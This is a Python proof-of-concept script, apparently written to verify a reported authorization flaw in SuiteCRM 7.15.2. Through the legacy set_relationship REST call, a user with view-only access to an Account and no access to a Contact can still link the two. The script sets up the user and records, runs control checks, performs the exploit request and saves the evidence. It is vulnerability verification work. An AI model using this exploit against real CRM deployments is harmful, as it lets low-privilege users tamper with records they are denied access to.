#!/usr/bin/env python3
"""
VULN-078 -- Legacy `set_relationship`: relate/detach arbitrary records with only VIEW
            on the primary and NO check at all on the related record (BOLA).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/core/SoapHelperWebService.php:852 (->add($related_ids,...)) / :855
             (->delete(...)) -- the sole guard at :832 is $mod->ACLAccess('DetailView') on the
             PRIMARY record only; $related_ids never gets any ACL check at all.

Plan
----
1. As admin, create a throwaway Role for a fresh low-priv user that:
     - DENIES Accounts 'edit'  (leaves Accounts 'view' at its default ALL)
     - DENIES Contacts 'view' AND 'edit' entirely (the related record: zero access)
   This puts the low-priv user in the exact shape the finding describes: view-only on the
   primary, nothing at all on the related record.
2. Admin creates an Account (primary) and a Contact (related, admin-owned).
3. Control checks, over the low-priv session:
     a. attempt to EDIT the Account (set_entry) -> must be DENIED (no edit ACL)
     b. attempt to READ the Contact (get_entry) -> must be DENIED (no view ACL at all)
4. The actual bug: low-priv calls set_relationship(Accounts, <account_id>, "contacts",
   [<contact_id>]) -- expected DENIED if the framework enforced edit-on-primary +
   ACL-on-related; ACTUAL: succeeds, and a real accounts_contacts row appears in the DB.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, rest_login, rest_call)
from _c1_common import db_rows, restrict_role

VULN_ID = "VULN-078"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "set_relationship BOLA -- relate records with view-only primary + zero-access related")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)

    log("SETUP", "low-priv user; Role denies Accounts edit AND Contacts view+edit entirely")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    role_id = restrict_role(low["id"], [
        ("Accounts", "edit"),
        ("Contacts", "view"),
        ("Contacts", "edit"),
    ])
    log("OK", f"low-priv user {low['user_name']} id={low['id']}, role {role_id}")
    low_sid = rest_login(low["user_name"], low["password"])

    log("SETUP", "admin creates the primary Account and the related (victim) Contact")
    acct_name = f"Stage10 VULN-078 Account {rand('a')}"
    resA = rest_call("set_entry", [admin_sid, "Accounts", [{"name": "name", "value": acct_name}]])
    account_id = resA.get("id")
    contact_last = f"Stage10VULN078{rand('c')}"
    resC = rest_call("set_entry", [admin_sid, "Contacts", [
        {"name": "last_name", "value": contact_last}, {"name": "first_name", "value": "Victim"},
    ]])
    contact_id = resC.get("id")
    if not account_id or not contact_id:
        verdict(VULN_ID, "FAILED", f"could not create preconditions: account={resA} contact={resC}")
        sys.exit(1)
    log("OK", f"Account id={account_id} name={acct_name!r}; Contact id={contact_id} last_name={contact_last!r}")

    # --- Controls: confirm the low-priv user genuinely lacks edit-on-primary and any Contact access
    log("STEP", "control (a): low-priv attempts to EDIT the Account (must be denied)")
    edit_attempt = rest_call("set_entry", [low_sid, "Accounts", [
        {"name": "id", "value": account_id}, {"name": "name", "value": "PWNED-BY-LOWPRIV"},
    ]])
    log("INFO", f"edit attempt response: {edit_attempt}")
    acct_rows = db_rows(f"SELECT name FROM accounts WHERE id='{account_id}';")
    edit_blocked = bool(acct_rows) and acct_rows[0]["name"] == acct_name
    log("PROOF" if edit_blocked else "FAIL", f"control (a): Account name unchanged in DB = {edit_blocked}")

    log("STEP", "control (b): low-priv attempts to READ the Contact (must be denied)")
    read_attempt = rest_call("get_entry", [low_sid, "Contacts", contact_id, ["id", "last_name"], []])
    log("INFO", f"read attempt response: {read_attempt}")
    read_blocked = "Access Denied" in json.dumps(read_attempt) or not read_attempt.get("entry_list")
    log("PROOF" if read_blocked else "FAIL", f"control (b): Contact read denied = {read_blocked}")

    # --- The actual bug ------------------------------------------------------------------
    log("STEP", "VULNERABLE: low-priv calls set_relationship(Accounts/<account_id>, 'contacts', [<contact_id>])")
    rel = rest_call("set_relationship", [low_sid, "Accounts", account_id, "contacts", [contact_id]])
    log("INFO", f"set_relationship response: {rel}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f'method=set_relationship&input_type=JSON&response_type=JSON&rest_data='
            f'["{low_sid}","Accounts","{account_id}","contacts",["{contact_id}"]]\n'
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(rel, indent=2))
    with open(os.path.join(HERE, "evidence", "control_edit_account.json"), "w") as f:
        json.dump(edit_attempt, f, indent=2)
    with open(os.path.join(HERE, "evidence", "control_read_contact.json"), "w") as f:
        json.dump(read_attempt, f, indent=2)
    with open(os.path.join(HERE, "evidence", "set_relationship_response.json"), "w") as f:
        json.dump(rel, f, indent=2)

    rel_rows = db_rows(
        f"SELECT id, account_id, contact_id, deleted FROM accounts_contacts "
        f"WHERE account_id='{account_id}' AND contact_id='{contact_id}' AND deleted=0;"
    )
    log("INFO", f"accounts_contacts rows for this pair: {rel_rows}")
    relationship_written = bool(rel_rows)
    api_reported_created = rel.get("created") == 1 and rel.get("failed") == 0

    log("PROOF", f"low-priv (Accounts edit=NONE, Contacts view=edit=NONE) related Account<->Contact = "
                 f"{relationship_written} (API created={rel.get('created')}, DB row exists={relationship_written})")

    ok = edit_blocked and read_blocked and relationship_written and api_reported_created
    if not ok:
        reasons = []
        if not edit_blocked:
            reasons.append("control (a) failed: Account edit was not actually blocked")
        if not read_blocked:
            reasons.append("control (b) failed: Contact read was not actually blocked")
        if not relationship_written:
            reasons.append("set_relationship did not create a real accounts_contacts row")
        if not api_reported_created:
            reasons.append(f"API did not report created=1: {rel}")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "Confirmed: a user with only view (not edit) on the primary Account and ZERO access "
              "(view or edit) to the Contact successfully related them -- a real accounts_contacts row "
              "was written -- while the same user's direct edit of the Account and read of the Contact "
              "were both correctly denied.")
    verdict(VULN_ID, "CONFIRMED",
            f"low-priv user (Accounts edit=NONE, Contacts view=edit=NONE) related Account {account_id} "
            f"<-> Contact {contact_id} via set_relationship; accounts_contacts row confirmed in DB; "
            f"direct edit/read of the same records via the same session were denied")
    sys.exit(0)


if __name__ == "__main__":
    main()
